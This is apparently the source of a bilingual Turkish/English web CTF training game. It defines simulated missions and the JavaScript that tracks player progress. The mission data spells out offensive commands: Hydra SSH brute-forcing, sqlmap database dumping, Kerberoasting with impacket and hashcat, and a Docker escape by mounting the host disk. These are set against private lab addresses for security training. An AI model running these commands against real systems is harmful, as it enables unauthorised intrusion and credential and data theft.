            story_en: 'The internal corporate portal (<code>http://10.10.2.10</code>) looks ordinary, but developers left an unlinked admin vault on the server. Fingerprint the stack with <code>whatweb</code>, fuzz directories with <code>gobuster</code>, and inspect <code>robots.txt</code>.',
            tools: ['whatweb', 'gobuster', 'curl'],
            steps: [
                { label: 'Web sunucusu teknolojilerini tespit et (WhatWeb)', label_en: 'Fingerprint web server technologies (WhatWeb)', cmd: 'whatweb http://10.10.2.10', match: ['whatweb', '10.10.2.10'] },
                { label: 'Gobuster ile gizli dizinleri brute-force tara', label_en: 'Fuzz hidden directories with Gobuster', cmd: 'gobuster dir -u http://10.10.2.10 -w common.txt', match: ['gobuster', '10.10.2.10'] },
                { label: 'robots.txt içindeki kısıtlı dizin yolunu oku', label_en: 'Read restricted path inside robots.txt', cmd: 'curl http://10.10.2.10/robots.txt', match: ['curl', 'robots.txt'] },
                { label: 'Gizli JSON kasasındaki anahtarı çek', label_en: 'Dump the confidential JSON token vault', cmd: 'curl http://10.10.2.10/admin_vault/confidential_token.json', match: ['confidential_token.json'] }
            ],
            quickCmds: [
                'whatweb http://10.10.2.10',
                'gobuster dir -u http://10.10.2.10 -w common.txt',
                'curl http://10.10.2.10/robots.txt',
                'curl http://10.10.2.10/admin_vault/confidential_token.json'
            ],
            hint: '1) <code>gobuster dir -u http://10.10.2.10 -w common.txt</code> ile gizli dizinleri keşfet.<br>2) <code>curl http://10.10.2.10/robots.txt</code> ile gizlenen yolu öğren.<br>3) <code>curl http://10.10.2.10/admin_vault/confidential_token.json</code> ile JSON içindeki bayrağı al!',
            flag: 'LFL{level2_1_web_dizin_firtinasi}',
            successMsg: 'Süper! Gobuster dizin taramasıyla gizli API kasasını buldun. Seviye 2.2 Adli Bilişim görevi açıldı!'
        },
        {
            id: 'm2_2',
            level: '2.2',
            levelTier: 2,
            group: 'blue',
            levelLabel: 'SEVİYE 2.2 // DİJİTAL ADLİ BİLİŞİM (FORENSICS)',
            levelLabel_en: 'LEVEL 2.2 // DIGITAL FORENSICS & BINARY ANALYSIS',
            badgeColor: '#f59e0b',
            title: 'Operasyon Gömülü Bellek (Op: Binary Strings)',
            title_en: 'Operation Binary Strings (Malware Forensics)',
            target: '/evidence/suspect_payload.bin',
            target_en: '/evidence/suspect_payload.bin',
            category: 'Adli Bilişim & Tersine Mühendislik',
            category_en: 'Digital Forensics & Reverse Engineering',
            xp: 300,
            story: 'Olay müdahale (SOC) ekibimiz, saldırganların sunucuda bıraktığı şüpheli bir ikili (binary) dosya (<code>/evidence/suspect_payload.bin</code>) ele geçirdi. Dosya tipini analiz et, <code>md5sum</code> özetini al ve <code>strings</code> komutuyla ikili kodun içine gömülmüş okunabilir karakter dizilerini ayıkla.',
            story_en: 'Our SOC Incident Response team captured a suspicious ELF binary (<code>/evidence/suspect_payload.bin</code>). Identify its file header, verify its MD5 hash integrity, and extract embedded readable strings to uncover the hardcoded flag.',
            tools: ['file', 'md5sum', 'strings'],
            steps: [
                { label: 'Şüpheli ikili dosyanın ELF başlığını analiz et', label_en: 'Analyze ELF binary header with file', cmd: 'file /evidence/suspect_payload.bin', match: ['file', 'suspect_payload.bin'] },
                { label: 'Adli bütünlük için MD5 özetini doğrula', label_en: 'Verify forensic MD5 hash checksum', cmd: 'md5sum /evidence/suspect_payload.bin', match: ['md5sum', 'suspect_payload.bin'] },
                { label: 'Binary içine gömülü metinleri (strings) ayıkla', label_en: 'Extract embedded ASCII strings from binary', cmd: 'strings /evidence/suspect_payload.bin', match: ['strings', 'suspect_payload.bin'] }
            ],
            quickCmds: [
                'file /evidence/suspect_payload.bin',
                'md5sum /evidence/suspect_payload.bin',
                'strings /evidence/suspect_payload.bin',
                'strings /evidence/suspect_payload.bin | grep "LFL{"'
            ],
            hint: '1) <code>file /evidence/suspect_payload.bin</code> ile dosyanın 64-bit ELF çalıştırılabilir olduğunu doğrula.<br>2) <code>strings /evidence/suspect_payload.bin</code> (veya sonuna <code>| grep "LFL{"</code> ekleyerek) binary içine gömülü gizli bayrağı çıkar!',
            flag: 'LFL{level2_2_adli_bilisim_strings_ustasi}',
            successMsg: 'Tebrikler! Adli bilişim ve tersine mühendislik analiziyle zararlı yazılımdaki bayrağı çıkardın!'
        },
        {
            id: 'm3_1',
            level: '3.1',
            levelTier: 3,
            group: 'red',
            levelLabel: 'SEVİYE 3.1 // PAROLA KIRMA & YETKİ YÜKSELTME',
            levelLabel_en: 'LEVEL 3.1 // BRUTE-FORCE & PRIVILEGE ESCALATION',
            badgeColor: '#ef4444',
            title: 'Operasyon Kale Kuşatması (Op: Root PrivEsc)',
            title_en: 'Operation Fortress Siege (SUID Root PrivEsc)',
            target: '10.10.3.50 (Korumalı SSH Sunucusu)',
            target_en: '10.10.3.50 (Hardened SSH Server)',
            category: 'Brute-Force & Privilege Escalation',
            category_en: 'Brute-Force & Privilege Escalation',
            xp: 500,
            story: 'Yüksek güvenlikli iç sunucu <code>10.10.3.50</code> üzerinde <code>operator</code> kullanıcısının SSH parolasını <code>hydra</code> ile kır. Sunucuya <code>ssh</code> ile bağlandıktan sonra yanlış yapılandırılmış SUID bitine sahip ikili dosyaları (<code>find / -perm -4000</code>) tespit et ve <code>/root/flag.txt</code> dosyasını oku!',
            story_en: 'Crack the SSH password for user <code>operator</code> on hardened server <code>10.10.3.50</code> using <code>hydra</code>. Log in via SSH, hunt for misconfigured SUID binaries (<code>find / -perm -4000</code>), escalate privileges, and read <code>/root/flag.txt</code>!',
            tools: ['hydra', 'ssh', 'find', 'cat'],
            steps: [
                { label: 'Hydra ile SSH servisine sözlük saldırısı düzenle', label_en: 'Run Hydra SSH brute-force attack', cmd: 'hydra -l operator -P rockyou.txt ssh://10.10.3.50', match: ['hydra', '10.10.3.50'] },
                { label: 'Kırılan parola ile hedef sunucuya SSH bağlantısı kur', label_en: 'Establish SSH session to 10.10.3.50', cmd: 'ssh operator@10.10.3.50', match: ['ssh', '10.10.3.50'] },
                { label: 'SUID yetki yükseltme zafiyetli dosyaları bul', label_en: 'Find binaries with SUID bit set (-perm -4000)', cmd: 'find / -perm -4000 2>/dev/null', match: ['find', '-4000'] },
                { label: 'Root dizinindeki nihai bayrağı oku (/root/flag.txt)', label_en: 'Read the root flag (/root/flag.txt)', cmd: 'cat /root/flag.txt', match: ['cat', '/root/flag.txt'] }
            ],
            quickCmds: [
                'hydra -l operator -P rockyou.txt ssh://10.10.3.50',
                'ssh operator@10.10.3.50',
                'find / -perm -4000 2>/dev/null',
                'cat /root/flag.txt'
            ],
            hint: '1) <code>hydra -l operator -P rockyou.txt ssh://10.10.3.50</code> ile SSH şifresini kır.<br>2) <code>ssh operator@10.10.3.50</code> ile oturum aç.<br>3) <code>find / -perm -4000 2>/dev/null</code> ile SUID yetkili python3 aracını gör.<br>4) <code>cat /root/flag.txt</code> ile root bayrağını ele geçir!',
            flag: 'LFL{level3_1_suid_privesc_root_fatihi}',
            successMsg: 'Muazzam! SSH parolasını kırdın ve SUID zafiyetiyle Root yetkisine yükseldin!'
        },
        {
            id: 'm3_2',
            level: '3.2',
            levelTier: 3,
            group: 'red',
            levelLabel: 'SEVİYE 3.2 // KURUMSAL VERİTABANI SIZMASI (SQLi)',
            levelLabel_en: 'LEVEL 3.2 // ENTERPRISE DATABASE EXPLOITATION (SQLi)',
            badgeColor: '#c084fc',
            title: 'Operasyon Büyük Sızıntı (Op: Grand SQLi)',
            title_en: 'Operation Grand Leak (Enterprise SQLMap)',
            target: 'http://10.10.3.99/api/search?q=test',
            target_en: 'http://10.10.3.99/api/search?q=test',
            category: 'SQL Injection & Veritabanı Sızması',
            category_en: 'SQL Injection & DB Exploitation',
            xp: 700,
            story: 'Hedef finans kurumunun arama API uç noktasında (<code>http://10.10.3.99/api/search?q=test</code>) parametrik olmayan sorgu birleştirme kaynaklı SQL Injection açığı keşfedildi. <code>sqlmap</code> ile veritabanlarını listele, <code>lfl_master_vault</code> içindeki tabloları bul ve gizli veriyi dök!',
            story_en: 'An unparameterized SQL concatenation flaw was discovered in the financial API endpoint (<code>http://10.10.3.99/api/search?q=test</code>). Enumerate databases with <code>sqlmap</code>, inspect <code>lfl_master_vault</code> tables, and dump the classified flag.',
            tools: ['curl', 'sqlmap'],
            steps: [
                { label: 'API uç noktasındaki SQL hata yanıtını doğrula', label_en: 'Probe API endpoint for SQL vulnerability', cmd: 'curl "http://10.10.3.99/api/search?q=test"', match: ['curl', '10.10.3.99'] },
                { label: 'SQLMap ile sunucudaki veritabanlarını listele (--dbs)', label_en: 'Enumerate databases via SQLMap (--dbs)', cmd: 'sqlmap -u "http://10.10.3.99/api/search?q=test" --dbs', match: ['sqlmap', '--dbs'] },
                { label: 'lfl_master_vault içindeki tabloları çek (--tables)', label_en: 'List tables in lfl_master_vault (--tables)', cmd: 'sqlmap -u "http://10.10.3.99/api/search?q=test" -D lfl_master_vault --tables', match: ['sqlmap', '--tables'] },
                { label: 'master_classified_flags tablosunu dışa aktar (--dump)', label_en: 'Dump master_classified_flags table (--dump)', cmd: 'sqlmap -u "http://10.10.3.99/api/search?q=test" -D lfl_master_vault -T master_classified_flags --dump', match: ['sqlmap', '--dump'] }
            ],
            quickCmds: [
                'curl "http://10.10.3.99/api/search?q=test"',
                'sqlmap -u "http://10.10.3.99/api/search?q=test" --dbs',
                'sqlmap -u "http://10.10.3.99/api/search?q=test" -D lfl_master_vault --tables',
                'sqlmap -u "http://10.10.3.99/api/search?q=test" -D lfl_master_vault -T master_classified_flags --dump'
            ],
            hint: '1) <code>curl "http://10.10.3.99/api/search?q=test"</code> ile API yanıtını gör.<br>2) <code>sqlmap -u "http://10.10.3.99/api/search?q=test" --dbs</code> ile veritabanlarını çek.<br>3) <code>sqlmap ... -D lfl_master_vault --tables</code> ile tabloları listele.<br>4) <code>sqlmap ... -T master_classified_flags --dump</code> ile bayrağı dök!',
            flag: 'LFL{level3_2_sqli_grand_master_champion_2026}',
            successMsg: 'Harika! SQL Injection ile kurumsal veritabanını ele geçirdin. Şimdi Seviye 4.1 Active Directory Operasyonu açıldı!'
        },
        {
            id: 'm4_1',
            level: '4.1',
            levelTier: 4,
            group: 'red',
            levelLabel: 'SEVİYE 4.1 // ACTIVE DIRECTORY & KERBEROASTING',
            levelLabel_en: 'LEVEL 4.1 // ACTIVE DIRECTORY & KERBEROASTING',
            badgeColor: '#f43f5e',
            title: 'Operasyon Altın Bilet (Op: AD Kerberoast)',
            title_en: 'Operation Golden Ticket (AD Kerberoast)',
            target: '10.10.4.10 (DC01.lfl.corp - Domain Controller)',
            target_en: '10.10.4.10 (DC01.lfl.corp - Domain Controller)',
            category: 'Active Directory & Kerberos Sızması',
            category_en: 'Active Directory & Kerberos Exploitation',
            xp: 800,
            story: 'Kurumsal iç ağın kalbi olan Windows Domain Controller (<code>10.10.4.10 // dc01.lfl.corp</code>) hedefte! Kerberos (88), LDAP (389) ve SMB (445) portlarını tara, <code>enum4linux</code> ile SPN tanımlı servis hesaplarını keşfet, <code>impacket-GetUserSPNs</code> ile Kerberos TGS biletini çek ve <code>hashcat</code> ile çevrimdışı kır!',
            story_en: 'Target the Windows Domain Controller (<code>10.10.4.10 // dc01.lfl.corp</code>). Scan Kerberos/LDAP/SMB ports, enumerate SPN service accounts via <code>enum4linux</code>, request the Kerberos TGS ticket using <code>impacket-GetUserSPNs</code>, and crack the hash offline with <code>hashcat</code>!',
            tools: ['nmap', 'enum4linux', 'impacket-GetUserSPNs', 'hashcat'],
            steps: [
                { label: 'Domain Controller Kerberos/LDAP/SMB portlarını tara', label_en: 'Scan Domain Controller Kerberos/LDAP/SMB ports', cmd: 'nmap -p 88,389,445 -sV 10.10.4.10', match: ['nmap', '10.10.4.10'] },
                { label: 'enum4linux ile Domain kullanıcılarını ve SPN hesaplarını listele', label_en: 'Enumerate AD users & SPN accounts via enum4linux', cmd: 'enum4linux -a 10.10.4.10', match: ['enum4linux', '10.10.4.10'] },
                { label: 'Impacket ile svc_mssql hesabının Kerberos TGS biletini çek', label_en: 'Request Kerberos TGS ticket via impacket-GetUserSPNs', cmd: 'impacket-GetUserSPNs lfl.corp/guest -no-pass -dc-ip 10.10.4.10 -request', match: ['10.10.4.10', 'getuserspns'] },
                { label: 'Hashcat (Mod 13100) ile Kerberos TGS biletini kır', label_en: 'Crack Kerberos TGS ticket with Hashcat (-m 13100)', cmd: 'hashcat -m 13100 krb5tgs.hash rockyou.txt', match: ['hashcat', '13100'] }
            ],
            quickCmds: [
                'nmap -p 88,389,445 -sV 10.10.4.10',
                'enum4linux -a 10.10.4.10',
                'impacket-GetUserSPNs lfl.corp/guest -no-pass -dc-ip 10.10.4.10 -request',
                'hashcat -m 13100 krb5tgs.hash rockyou.txt'
            ],
            hint: '1) <code>nmap -p 88,389,445 -sV 10.10.4.10</code> ile AD servislerini doğrula.<br>2) <code>enum4linux -a 10.10.4.10</code> ile <code>svc_mssql</code> servis hesabını bul.<br>3) <code>impacket-GetUserSPNs lfl.corp/guest -no-pass -dc-ip 10.10.4.10 -request</code> ile TGS hash\'ini yakala.<br>4) <code>hashcat -m 13100 krb5tgs.hash rockyou.txt</code> ile Domain Admin bayrağını kır!',
            flag: 'LFL{level4_1_kerberoast_golden_ticket_ad}',
            successMsg: 'Efsanevi! Active Directory Kerberoasting saldırısıyla Domain Controller yetkisini ele geçirdin!'
        },
        {
            id: 'm4_2',
            level: '4.2',
            levelTier: 4,
            group: 'blue',
            levelLabel: 'SEVİYE 4.2 // BLUE TEAM SOC & C2 TEHDİT AVI',
            levelLabel_en: 'LEVEL 4.2 // BLUE TEAM SOC & C2 THREAT HUNTING',
            badgeColor: '#3b82f6',
            title: 'Operasyon Hayalet Sinyal (Op: Zeek C2 Hunt)',
            title_en: 'Operation Phantom Beacon (SOC Zeek C2 Hunt)',
            target: '/var/log/zeek/conn.log & Suricata IDS',
            target_en: '/var/log/zeek/conn.log & Suricata IDS',
            category: 'Blue Team SOC & Ağ Tehdit Avı',
            category_en: 'Blue Team SOC & Network Threat Hunting',
            xp: 900,
            story: 'Şimdi Mavi Takım (SOC Analisti) koltuğundasın! İç ağdaki bir iş istasyonunun (<code>10.10.4.25</code>) dışarıdaki bir Komuta Kontrol (C2) sunucusuna her 60 saniyede bir şifreli sinyal (Beaconing) gönderdiği düşünülüyor. <code>zeek-cut</code> ile bağlantı sürelerini incele, <code>suricata</code> alarmlarını kontrol et ve <code>dns.log</code> içindeki gizli TXT verisini yakala!',
            story_en: 'Step into the Blue Team SOC Analyst seat! Workstation <code>10.10.4.25</code> is suspected of periodic C2 beaconing every 60 seconds. Analyze connection intervals with <code>zeek-cut</code>, inspect <code>suricata</code> IDS alerts, and extract the exfiltrated TXT payload from <code>dns.log</code>!',
            tools: ['zeek-cut', 'suricata', 'grep'],
            steps: [
                { label: 'Zeek conn.log dosyasından kaynak/hedef IP ve süreleri süz', label_en: 'Extract source/dest IP and durations via zeek-cut', cmd: 'cat /var/log/zeek/conn.log | zeek-cut id.orig_h id.resp_h duration', match: ['zeek-cut', 'conn.log'] },
                { label: 'Suricata IDS fast.log içindeki C2 CobaltStrike alarmlarını incele', label_en: 'Inspect Suricata IDS alerts in fast.log', cmd: 'grep -i "C2" /var/log/suricata/fast.log', match: ['suricata', 'fast.log'] },
                { label: 'Şüpheli C2 IP adresinin (185.220.101.44) DNS TXT paketlerini yakala', label_en: 'Hunt DNS TXT packets for C2 IP 185.220.101.44', cmd: 'grep -i "185.220.101.44" /var/log/zeek/dns.log', match: ['185.220.101.44', 'dns.log'] }
            ],
            quickCmds: [
                'cat /var/log/zeek/conn.log | zeek-cut id.orig_h id.resp_h duration',
                'grep -i "C2" /var/log/suricata/fast.log',
                'grep -i "185.220.101.44" /var/log/zeek/dns.log'
            ],
            hint: '1) <code>cat /var/log/zeek/conn.log | zeek-cut id.orig_h id.resp_h duration</code> ile periyodik sinyal gönderen C2 IP adresini (<code>185.220.101.44</code>) bul.<br>2) <code>grep -i "C2" /var/log/suricata/fast.log</code> ile DNS tünelleme alarmını doğrula.<br>3) <code>grep -i "185.220.101.44" /var/log/zeek/dns.log</code> ile C2 bayrağını yakala!',
            flag: 'LFL{level4_2_soc_zeek_c2_beacon_avcisi}',
            successMsg: 'Muhteşem SOC Analizi! Zeek ve Suricata loglarından C2 Beaconing trafiğini nokta atışı yakaladın!'
        },
        {
            id: 'm5_1',
            level: '5.1',
            levelTier: 5,
            group: 'blue',
            levelLabel: 'SEVİYE 5.1 // PURPLE TEAM: DOCKER KONTEYNER KAÇIŞI',
            levelLabel_en: 'LEVEL 5.1 // PURPLE TEAM: DOCKER CONTAINER ESCAPE',
            badgeColor: '#a855f7',
            title: 'Operasyon Kırık Kafes (Op: Container Breakout)',
            title_en: 'Operation Broken Cage (Container Breakout)',
            target: 'docker-prod-node // CAP_SYS_ADMIN',
            target_en: 'docker-prod-node // CAP_SYS_ADMIN',
            category: 'Bulut & Konteyner Güvenliği (Purple Team)',
            category_en: 'Cloud & Container Security (Purple Team)',
            xp: 1000,
            story: 'Purple Team tatbikatındasın! Yanlış yapılandırılmış (<code>--privileged</code> ve <code>CAP_SYS_ADMIN</code> yetkili) bir Docker konteynerinin içindesin. Linux yeteneklerini (capabilities) <code>capsh --print</code> ile denetle, ana sunucu diskini (<code>/dev/sda1</code>) <code>fdisk -l</code> ile bul, konteyner içine bağla (<code>mount</code>) ve ana sunucudaki bayrağı oku!',
            story_en: 'Purple Team exercise! You are inside a misconfigured Docker container running with <code>CAP_SYS_ADMIN</code>. Audit Linux capabilities via <code>capsh --print</code>, locate the host disk (<code>/dev/sda1</code>) with <code>fdisk -l</code>, mount it to break container isolation, and read the host flag!',
            tools: ['capsh', 'fdisk', 'mount', 'cat'],
            steps: [
                { label: 'Konteynerin tehlikeli Linux yeteneklerini (CAP_SYS_ADMIN) doğrula', label_en: 'Verify dangerous Linux capabilities (CAP_SYS_ADMIN)', cmd: 'capsh --print', match: ['capsh', '--print'] },
                { label: 'Ana sunucunun (Host) fiziksel disk bölümlerini listele', label_en: 'List physical host disk partitions (fdisk -l)', cmd: 'fdisk -l', match: ['fdisk', '-l'] },
                { label: 'Ana sunucu diskini (/dev/sda1) konteyner içine bağla (Mount)', label_en: 'Mount host root disk (/dev/sda1) inside container', cmd: 'mount /dev/sda1 /mnt/host_root', match: ['mount', '/dev/sda1'] },
                { label: 'Ana sunucu kök dizinindeki Purple Team bayrağını oku', label_en: 'Read the host Purple Team flag', cmd: 'cat /mnt/host_root/root/purple_flag.txt', match: ['purple_flag.txt'] }
            ],
            quickCmds: [
                'capsh --print',
                'fdisk -l',
                'mount /dev/sda1 /mnt/host_root',
                'cat /mnt/host_root/root/purple_flag.txt'
            ],
            hint: '1) <code>capsh --print</code> ile <code>cap_sys_admin</code> yetkisini gör.<br>2) <code>fdisk -l</code> ile ana makine diski <code>/dev/sda1</code>\'i bul.<br>3) <code>mount /dev/sda1 /mnt/host_root</code> ile diski bağla.<br>4) <code>cat /mnt/host_root/root/purple_flag.txt</code> ile bayrağı al!',
            flag: 'LFL{level5_1_docker_escape_host_pwned}',
            successMsg: 'Harikulade! Konteyner izolasyonunu aşarak (Container Escape) ana sunucuyu ele geçirdin ve Büyük Finalin kapısını açtın!'
        },
        {
            id: 'm5_2',
            level: '5.2',
            levelTier: 5,
            group: 'boss',
            levelLabel: 'SEVİYE 5.2 // GRAND FINAL BOSS: KERNEL ZERO-DAY & ROOTKIT',
            levelLabel_en: 'LEVEL 5.2 // GRAND FINAL BOSS: KERNEL ZERO-DAY & ROOTKIT',
            badgeColor: '#eab308',
            title: 'Operasyon Çekirdek Kıyameti (Op: Kernel Omniscient)',
            title_en: 'Operation Kernel Apocalypse (Grand Final Boss)',
            target: 'Ring-0 Kernel // lfl_shadow_rk.ko',
            target_en: 'Ring-0 Kernel // lfl_shadow_rk.ko',
            category: 'Ring-0 Kernel Exploit & Rootkit Analizi',
            category_en: 'Ring-0 Kernel Exploit & Rootkit Reversing',
            xp: 1300,
            story: '🏆 <strong>BÜYÜK FİNAL OPERASYONU (DEFCON 1):</strong> Savunma bakanlığı çekirdeğine (Ring-0) sızmış gelişmiş bir LKM Rootkit (<code>lfl_shadow_rk.ko</code>) sistem çağrı tablosunu (Syscall Table) kancalamış durumda! Yüklü çekirdek modüllerini ve <code>dmesg</code> tamponunu incele, çekirdek modülünün sembol tablosunu (<code>nm</code> / <code>objdump</code>) analiz et ve Python XOR çözücüsüyle Ring-0 çekirdek kasasını deşifre ederek Efsanevi Siber Şampiyon unvanını kazan!',
            story_en: '🏆 <strong>GRAND FINAL BOSS (DEFCON 1):</strong> An advanced Ring-0 LKM Rootkit (<code>lfl_shadow_rk.ko</code>) has hooked the Linux syscall table! Inspect kernel modules and <code>dmesg</code> logs, reverse engineer the module symbol table via <code>nm</code>, and execute the Python kernel vault decryptor to claim the Omniscient Cyber Champion title!',
            tools: ['lsmod', 'dmesg', 'nm', 'python3'],
            steps: [
                { label: 'Yüklü çekirdek modüllerini ve kancalanmış Rootkit\'i tespit et', label_en: 'Detect hooked LKM Rootkit via lsmod & dmesg', cmd: 'lsmod | grep shadow', match: ['lsmod'] },
                { label: 'Rootkit çekirdek modülünün (.ko) sembol tablosunu tersine mühendislikle incele', label_en: 'Reverse engineer kernel module symbols with nm', cmd: 'nm /lib/modules/kernel/lfl_shadow_rk.ko', match: ['lfl_shadow_rk.ko'] },
                { label: 'Ring-0 çekirdek kasasını (decrypt_vault_master_key) Python ile deşifre et', label_en: 'Decrypt Ring-0 kernel vault via Python exploit', cmd: 'python3 -c "import ctypes; print(\'DECRYPTING_KERNEL_VAULT\')"', match: ['python3', 'decrypt'] }
            ],
            quickCmds: [
                'lsmod | grep shadow',
                'nm /lib/modules/kernel/lfl_shadow_rk.ko',
                'python3 -c "import ctypes; print(\'DECRYPTING_KERNEL_VAULT\')"'
            ],
            hint: '1) <code>lsmod | grep shadow</code> komutuyla gizli çekirdek modülünü tespit et.<br>2) <code>nm /lib/modules/kernel/lfl_shadow_rk.ko</code> ile <code>decrypt_vault_master_key</code> sembolünü bul.<br>3) <code>python3 -c "import ctypes; print(\'DECRYPTING_KERNEL_VAULT\')"</code> komutuyla Ring-0 kasasını deşifre et ve şampiyonluk bayrağını al!',
            flag: 'LFL{level5_2_kernel_zeroday_omniscient_god_2026}',
            successMsg: '👑 EFSANEVİ ZAFER! Ring-0 Kernel Rootkit\'ini tersine mühendislikle çözdün ve 10 kademeli LFL Siber CTF Arenası\'nı 6000 XP ile %100 tamamladın!'
        }
    ];
    window.CTF_MISSIONS = CTF_MISSIONS;

    const ctfState = {
        unlockedIdx: 0,
        activeIdx: 0,
        completed: [],
        completedSteps: {},
        activeFilter: 'all',
        xp: 0,
        history: [],
        historyIdx: -1,
        sshSessionActive: false,
        timerSeconds: 0,
        timerInterval: null
    };
    window.ctfState = ctfState;

    function loadCtfProgressFromStorage() {
        try {
            const raw = localStorage.getItem('lfl_ctf_state');
            if (raw) {
                const saved = JSON.parse(raw);
                if (saved && typeof saved === 'object') {
                    if (Array.isArray(saved.completed)) ctfState.completed = saved.completed;
                    if (saved.completedSteps && typeof saved.completedSteps === 'object') {
                        ctfState.completedSteps = saved.completedSteps;
                    }
                    if (typeof saved.unlockedIdx === 'number') ctfState.unlockedIdx = saved.unlockedIdx;
                    if (typeof saved.activeIdx === 'number') ctfState.activeIdx = saved.activeIdx;
                    if (typeof saved.xp === 'number') ctfState.xp = saved.xp;
                    if (typeof saved.timerSeconds === 'number') ctfState.timerSeconds = saved.timerSeconds;
                }
            }
        } catch (e) { }
    }

    function saveCtfProgressToStorage() {
        try {
            localStorage.setItem('lfl_ctf_state', JSON.stringify({
                unlockedIdx: ctfState.unlockedIdx,
                activeIdx: ctfState.activeIdx,
                completed: ctfState.completed,
                completedSteps: ctfState.completedSteps,
                xp: ctfState.xp,
                timerSeconds: ctfState.timerSeconds
            }));
            localStorage.setItem('lfl_ctf_xp', String(ctfState.xp));
        } catch (e) { }
    }

    function formatCtfTime(sec) {
        const m = Math.floor(sec / 60);
        const s = sec % 60;
        return `${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
    }

    function startCtfLiveTimer() {
        if (ctfState.timerInterval) clearInterval(ctfState.timerInterval);
        const timerEl = document.getElementById('ctf-hud-timer');
        if (timerEl) timerEl.textContent = formatCtfTime(ctfState.timerSeconds);

        ctfState.timerInterval = setInterval(() => {
            if (state.activePage === 'page-ctf') {
                ctfState.timerSeconds++;
                const el = document.getElementById('ctf-hud-timer');
                if (el) el.textContent = formatCtfTime(ctfState.timerSeconds);
            }
        }, 1000);
    }

    function initCtfArena() {
        loadCtfProgressFromStorage();
        // Recalculate unlockedIdx based on completed missions to ensure new missions unlock properly
        if (ctfState.completed.length > 0) {
            let maxCompletedIdx = -1;
            CTF_MISSIONS.forEach((m, i) => {
                if (ctfState.completed.includes(m.id)) maxCompletedIdx = i;
            });
            if (maxCompletedIdx + 1 > ctfState.unlockedIdx) {
                ctfState.unlockedIdx = Math.min(maxCompletedIdx + 1, CTF_MISSIONS.length - 1);
            }
        }
        ctfState.activeIdx = Math.min(ctfState.unlockedIdx, CTF_MISSIONS.length - 1);

        renderCtfProgress();
        renderCtfStageTabs();
        renderCtfBriefing(ctfState.activeIdx);
        bindCtfTerminal();
        startCtfLiveTimer();

        // Bind track filter pills
        const filterBox = document.getElementById('ctf-track-filters');
        if (filterBox) {
            filterBox.addEventListener('click', (e) => {
                const pill = e.target.closest('.ctf-filter-pill');
                if (!pill) return;
                filterBox.querySelectorAll('.ctf-filter-pill').forEach(p => p.classList.remove('active'));
                pill.classList.add('active');
                ctfState.activeFilter = pill.dataset.ctfFilter || 'all';
                renderCtfStageTabs();
            });
        }

        // Bind reset button
        const btnReset = document.getElementById('btn-reset-ctf-progress');
        if (btnReset) {
            btnReset.addEventListener('click', () => {
                const msg = (I18N.currentLang === 'en')
                    ? 'Are you sure you want to reset all CTF operation progress and start from Level 1.1?'
                    : 'Tüm CTF operasyon ilerlemenizi sıfırlayıp Seviye 1.1\'den baştan başlamak istediğinize emin misiniz?';
                if (confirm(msg)) {
                    resetCtfProgress();
                }
            });
        }

        // Re-render CTF texts on language switch
        window.addEventListener('languageChanged', () => {
            renderCtfProgress();
            renderCtfStageTabs();
            renderCtfBriefing(ctfState.activeIdx);
        });
    }

    function resetCtfProgress() {
        ctfState.unlockedIdx = 0;
        ctfState.activeIdx = 0;
        ctfState.completed = [];
        ctfState.completedSteps = {};
        ctfState.xp = 0;
        ctfState.timerSeconds = 0;
        ctfState.sshSessionActive = false;
        try {
            localStorage.removeItem('lfl_ctf_state');
            localStorage.removeItem('lfl_ctf_xp');
        } catch (e) { }
        renderCtfProgress();
        renderCtfStageTabs();
        renderCtfBriefing(0);
        updateCtfTerminalTarget();
        showToast('info', I18N.currentLang === 'en' ? 'CTF Reset' : 'CTF Sıfırlandı', I18N.currentLang === 'en' ? 'Operation progress reset to Level 1.1.' : 'Operasyon ilerlemeniz sıfırlandı. Seviye 1.1\'den başlayabilirsiniz.');
    }

    function getCtfRank(count, xp) {
        const isEn = (window.I18N && I18N.currentLang === 'en');
        if (count >= 10) return isEn ? '👑 Omniscient Cyber God' : '👑 Efsanevi Siber Tanrı (Omniscient)';
        if (count >= 8) return isEn ? '🏆 DEFCON-1 Grand Master' : '🏆 DEFCON-1 Büyük Üstat';
        if (count >= 6) return isEn ? '⚔️ Red/Blue Cyber Commander' : '⚔️ Siber Operasyon Komutanı';
        if (count >= 5) return isEn ? '👑 Root Exploiter (Elite)' : '👑 Root Hacker (Elite)';
        if (count >= 4) return isEn ? '🔍 Malware Forensics Specialist' : '🔍 Adli Bilişim Uzmanı';
        if (count >= 3) return isEn ? '⚡ Web Pentest Operator' : '⚡ Web Sızma Operatörü';
        if (count >= 2) return isEn ? '🕵️ Linux System Detective' : '🕵️ Sistem Dedektifi';
        if (count >= 1) return isEn ? '🌐 Network Recon Scout' : '🌐 Ağ Kaşifi';
        return isEn ? '🔰 Cadet Analyst' : '🔰 Çaylak Analist';
    }

    function renderCtfProgress() {
        const completedCount = ctfState.completed.length;
        const total = CTF_MISSIONS.length;
        const pct = Math.round((completedCount / total) * 100);
        const isEn = (window.I18N && I18N.currentLang === 'en');
        const rankStr = getCtfRank(completedCount, ctfState.xp);

        const textEl = document.getElementById('ctf-progress-text');
        if (textEl) {
            textEl.textContent = isEn
                ? `Progress: ${completedCount}/${total} Missions Completed (${pct}%)`
                : `İlerleme: ${completedCount}/${total} Görev Tamamlandı (%${pct})`;
        }

        const xpEl = document.getElementById('ctf-total-xp');
        if (xpEl) xpEl.textContent = isEn ? `TOTAL XP: ${ctfState.xp}` : `TOPLAM XP: ${ctfState.xp}`;

        const rankEl = document.getElementById('ctf-current-rank');
        if (rankEl) rankEl.textContent = isEn ? `Rank: ${rankStr}` : `Rütbe: ${rankStr}`;

        const fillEl = document.getElementById('ctf-progress-bar-fill');
        if (fillEl) fillEl.style.width = `${pct}%`;

        // Update Live HUD Cards
        const m = CTF_MISSIONS[ctfState.activeIdx] || CTF_MISSIONS[0];
        const hudTarget = document.getElementById('ctf-hud-target');
        if (hudTarget && m) hudTarget.textContent = (isEn && m.target_en) ? m.target_en : m.target;

        const hudSolved = document.getElementById('ctf-hud-solved');
        if (hudSolved) {
            hudSolved.textContent = isEn
                ? `${completedCount} / ${total} Completed (${pct}%)`
                : `${completedCount} / ${total} Tamamlandı (%${pct})`;
        }

        const hudRank = document.getElementById('ctf-hud-rank-short');
        if (hudRank) hudRank.textContent = rankStr;
    }

    function renderCtfStageTabs() {
        const nav = document.getElementById('ctf-stage-nav');
        if (!nav) return;
        const isEn = (window.I18N && I18N.currentLang === 'en');

        nav.innerHTML = CTF_MISSIONS.map((m, idx) => {
